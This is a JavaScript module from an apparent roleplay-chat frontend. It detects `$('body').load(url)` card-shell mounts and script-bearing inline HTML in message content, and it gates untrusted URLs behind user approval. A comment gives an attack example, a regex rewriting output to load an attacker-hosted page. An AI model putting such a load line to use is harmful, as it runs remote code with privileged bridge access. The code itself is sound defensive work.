/**
 * Detect executable card-shell mounts inside display_content after ST display regex.
 * test-card replaces 【首页】 / <customized> / <StatusPlaceHolderImpl/> with
 * `$('body').load('https://…/home|custom_start|status/index.html')` snippets.
 */

const LOAD_RE =
  /\$\(\s*['"]body['"]\s*\)\s*\.load\(\s*['"`](https?:\/\/[^'"`]+)['"`]\s*\)/gi

/**
 * @param {string} displayContent
 * @returns {{ mounts: Array<{url:string, kind:string}>, residualText: string }}
 */
export function extractShellMountsFromDisplay(displayContent) {
  const text = String(displayContent || '')
  const mounts = []
  const seen = new Set()
  let m
  const re = new RegExp(LOAD_RE.source, LOAD_RE.flags)
  while ((m = re.exec(text)) !== null) {
    const url = m[1]
    if (seen.has(url)) continue
    seen.add(url)
    mounts.push({ url, kind: classifyShellUrl(url) })
  }

  // Strip shell glue so residual static text can still render via RichContent.
  let residual = text
  residual = residual.replace(/```[\s\S]*?\$\(\s*['"]body['"]\s*\)\s*\.load\([\s\S]*?```/gi, '')
  residual = residual.replace(
    /<body[^>]*>\s*<script[^>]*>\s*\$\(\s*['"]body['"]\s*\)\s*\.load\([\s\S]*?<\/script>\s*<\/body>/gi,
    '',
  )
  residual = residual.replace(
    /\$\(\s*['"]body['"]\s*\)\s*\.load\(\s*['"`]https?:\/\/[^'"`]+['"`]\s*\)/gi,
    '',
  )
  residual = residual.replace(/\n{3,}/g, '\n\n').trim()

  return { mounts, residualText: residual }
}

export function classifyShellUrl(url) {
  const u = String(url || '').toLowerCase()
  if (u.includes('/status/')) return 'status'
  if (u.includes('/home/')) return 'opening_home'
  // `/intro/` 与后端 classify_shell_kind 的开场关键词保持一致（H5）
  if (u.includes('custom_start') || u.includes('/intro/')) return 'opening_custom'
  return 'message_html'
}

/**
 * Segment display_content into an ordered text/shell list (in-place rendering).
 *
 * The legacy extractors (`extractShellMountsFromDisplay` +
 * `extractInlineShellDocsFromDisplay`) chain destructive replaces, so a shell's
 * original position inside the narrative is lost and every shell renders
 * hoisted above the text. This segmenter runs a single span-claiming pass over
 * the ORIGINAL text so ShellAwareContent can render each shell exactly where
 * the card placed it (酒馆助手 renders in place; cards are designed for that).
 *
 * Claim priority (must match the legacy pass order so nested patterns never
 * double-match): fenced .load glue → body-script .load glue → bare .load call
 * → inline HTML document. A region containing `.load` is always a load mount,
 * never an inline doc. One deliberate edge: a bare `.load` inside a LARGER
 * html document claims only the call span, so the surrounding document falls
 * through to text rendering (sanitized, no execution) — hybrid shells like
 * that don't exist in real cards and text is the safe degradation.
 *
 * Semantics preserved from the legacy path:
 * - duplicate URLs: first occurrence becomes the mount, later ones are
 *   stripped without rendering (one URL = one iframe);
 * - no shells detected → a single text segment BYTE-IDENTICAL to the input
 *   (blank-line collapsing must never leak into plain messages);
 * - with shells, each text segment is collapsed (`\n{3,}` → `\n\n`) and
 *   trimmed, empty segments dropped;
 * - script-less HTML stays in text segments (RichContent, no sandbox needed).
 *
 * Streaming stability: content grows by appending, so `start` offsets of
 * already-emitted segments never move mid-stream. A whole-text rewrite (e.g.
 * display regex applied at stream end) may shift offsets once — inline shells
 * keyed by `start` are allowed to remount at that moment; load shells key by
 * URL and survive.
 *
 * @param {string} displayContent
 * @returns {Array<{type:'text', content:string}
 *   | {type:'shell', mode:'load', url:string, kind:string, start:number}
 *   | {type:'shell', mode:'inline', html:string, kind:string, start:number}>}
 */
export function segmentShellContent(displayContent) {
  const text = String(displayContent || '')
  if (!text) return [{ type: 'text', content: text }]

  const FENCE_GLUE_RE =
    /```[\s\S]*?\$\(\s*['"]body['"]\s*\)\s*\.load\([\s\S]*?```/gi
  const BODY_GLUE_RE =
    /<body[^>]*>\s*<script[^>]*>\s*\$\(\s*['"]body['"]\s*\)\s*\.load\([\s\S]*?<\/script>\s*<\/body>/gi
  const BARE_LOAD_RE =
    /\$\(\s*['"]body['"]\s*\)\s*\.load\(\s*['"`]https?:\/\/[^'"`]+['"`]\s*\)/gi
  const INLINE_DOC_RE =
    /<!DOCTYPE\s+html[\s\S]*?<\/html\s*>|<html[\s>][\s\S]*?<\/html\s*>|<body[\s>][\s\S]*?<\/body\s*>/gi

  /** @type {Array<{start:number, end:number, mode:string, urls?:string[], html?:string}>} */
  const regions = []
  const overlapsClaimed = (start, end) =>
    regions.some((r) => start < r.end && end > r.start)

  const passes = [
    [FENCE_GLUE_RE, 'load'],
    [BODY_GLUE_RE, 'load'],
    [BARE_LOAD_RE, 'load'],
    [INLINE_DOC_RE, 'inline'],
  ]
  for (const [re, mode] of passes) {
    let m
    while ((m = re.exec(text)) !== null) {
      const start = m.index
      const end = start + m[0].length
      if (overlapsClaimed(start, end)) continue
      if (mode === 'inline') {
        if (!/<script[\s>]/i.test(m[0])) continue
        regions.push({ start, end, mode, html: m[0] })
      } else {
        const urls = extractLoadUrlsFrom(m[0])
        if (!urls.length) continue
        regions.push({ start, end, mode, urls })
      }
    }
  }

  if (!regions.length) return [{ type: 'text', content: text }]

  regions.sort((a, b) => a.start - b.start)

  const segments = []
  const seenUrls = new Set()
  const pushText = (raw) => {
    const cleaned = raw.replace(/\n{3,}/g, '\n\n').trim()
    if (cleaned) segments.push({ type: 'text', content: cleaned })
  }
  let cursor = 0
  for (const region of regions) {
    if (region.start > cursor) pushText(text.slice(cursor, region.start))
    if (region.mode === 'inline') {
      segments.push({
        type: 'shell',
        mode: 'inline',
        html: region.html,
        kind: 'message_html',
        start: region.start,
      })
    } else {
      for (const url of region.urls) {
        if (seenUrls.has(url)) continue
        seenUrls.add(url)
        segments.push({
          type: 'shell',
          mode: 'load',
          url,
          kind: classifyShellUrl(url),
          start: region.start,
        })
      }
    }
    cursor = region.end
  }
  if (cursor < text.length) pushText(text.slice(cursor))
  return segments
}

function extractLoadUrlsFrom(regionText) {
  const urls = []
  const seen = new Set()
  const re = new RegExp(LOAD_RE.source, LOAD_RE.flags)
  let m
  while ((m = re.exec(regionText)) !== null) {
    if (seen.has(m[1])) continue
    seen.add(m[1])
    urls.push(m[1])
  }
  return urls
}

/**
 * Extract executable inline HTML documents from display_content (H4).
 *
 * Cards without remote shells ship their UI as huge regex replace_strings
 * (修炼界面/战斗系统 80-171KB): the backend display regex interpolates them
 * into display_content, where DOMPurify used to strip every script. Detect
 * full documents (`<!DOCTYPE…>` / `<html…>` / `<body…>`) that contain a
 * script and hand them to CardShellHost's inline `html` path instead.
 * Script-less HTML stays in RichContent — static markup needs no sandbox.
 *
 * @param {string} displayContent
 * @returns {{ docs: Array<{kind:string, html:string, inline:true}>, residualText: string }}
 */
export function extractInlineShellDocsFromDisplay(displayContent) {
  const text = String(displayContent || '')
  const re = /<!DOCTYPE\s+html[\s\S]*?<\/html\s*>|<html[\s>][\s\S]*?<\/html\s*>|<body[\s>][\s\S]*?<\/body\s*>/gi
  const docs = []
  const spans = []
  let m
  while ((m = re.exec(text)) !== null) {
    const html = m[0]
    if (!/<script[\s>]/i.test(html)) continue
    docs.push({ kind: 'message_html', html, inline: true })
    spans.push([m.index, m.index + html.length])
  }
  if (!docs.length) return { docs: [], residualText: text }
  let out = ''
  let last = 0
  for (const [start, end] of spans) {
    out += text.slice(last, start)
    last = end
  }
  out += text.slice(last)
  return { docs, residualText: out.replace(/\n{3,}/g, '\n\n').trim() }
}

/**
 * Parse an ST find_regex string (`/pattern/flags` or bare pattern) into a
 * JS RegExp. Returns null when the pattern does not compile.
 * @param {string} trigger
 * @returns {RegExp | null}
 */
export function parseStFindRegex(trigger) {
  const t = String(trigger || '').trim()
  if (!t) return null
  const wrapped = t.match(/^\/([\s\S]+)\/([a-z]*)$/i)
  try {
    if (wrapped) {
      return new RegExp(wrapped[1], wrapped[2].replace(/[^gimsuy]/g, ''))
    }
    return new RegExp(t)
  } catch {
    return null
  }
}

/**
 * True when any card-manifest inline-shell trigger matches the message text.
 * Anchors inline-document mounting to the card's own regex scripts: a doc in
 * display_content only auto-mounts when the message actually contains the
 * marker the card's find_regex rewrites (模型凭空输出的 <script> 文档不算).
 *
 * @param {string} sourceText message source (pre-display-regex) content
 * @param {Array<{trigger?: string} | string>} triggers manifest InlineHtml shells
 */
export function matchesAnyInlineShellTrigger(sourceText, triggers) {
  const text = String(sourceText || '')
  if (!text) return false
  for (const item of Array.isArray(triggers) ? triggers : []) {
    const trigger = typeof item === 'string' ? item : item?.trigger
    const re = parseStFindRegex(trigger)
    if (re && re.test(text)) return true
  }
  return false
}

/**
 * Split message-mounted shells into auto-mountable and confirm-gated (H3).
 *
 * Shell documents get full bridge privileges, so a `.load(url)` appearing in
 * message display_content is a code-execution decision, not a resource fetch.
 * Only URLs registered in the card's own shell manifest (extracted at import)
 * mount automatically; anything else — e.g. a card regex rewriting model
 * output to `.load('https://files.catbox.moe/<attacker>.html')` — must be
 * explicitly approved by the user for this session.
 *
 * @param {Array<{url:string, kind:string}>} mounts
 * @param {Array<string> | null | undefined} trustedUrls card-manifest URLs
 * @param {Array<string> | null | undefined} approvedUrls user-approved URLs
 * @returns {{ allowed: Array<object>, needsConfirmation: Array<object> }}
 */
export function partitionShellMountsByTrust(mounts, trustedUrls = [], approvedUrls = []) {
  const norm = (u) => String(u || '').trim()
  const toSet = (urls) =>
    new Set((Array.isArray(urls) ? urls : []).map(norm).filter(Boolean))
  const trusted = toSet(trustedUrls)
  const approved = toSet(approvedUrls)
  const allowed = []
  const needsConfirmation = []
  for (const mount of Array.isArray(mounts) ? mounts : []) {
    const url = norm(mount?.url)
    if (url && (trusted.has(url) || approved.has(url))) {
      allowed.push(mount)
    } else {
      needsConfirmation.push(mount)
    }
  }
  return { allowed, needsConfirmation }
}

/**
 * Prefer message-local shell mounts; fall back to campaign-level status URL.
 * @param {Array<{url:string, kind:string}>} mounts
 * @param {{ statusUrl?: string|null, openingUrl?: string|null }} fallback
 */
export function resolveShellSurfaces(mounts, fallback = {}) {
  const list = Array.isArray(mounts) ? mounts.slice() : []
  const hasStatus = list.some((x) => x.kind === 'status')
  const hasOpening = list.some(
    (x) => x.kind === 'opening_home' || x.kind === 'opening_custom',
  )
  if (!hasStatus && fallback.statusUrl) {
    list.unshift({ url: fallback.statusUrl, kind: 'status' })
  }
  if (!hasOpening && fallback.openingUrl) {
    list.push({
      url: fallback.openingUrl,
      kind: classifyShellUrl(fallback.openingUrl),
    })
  }
  return list
}
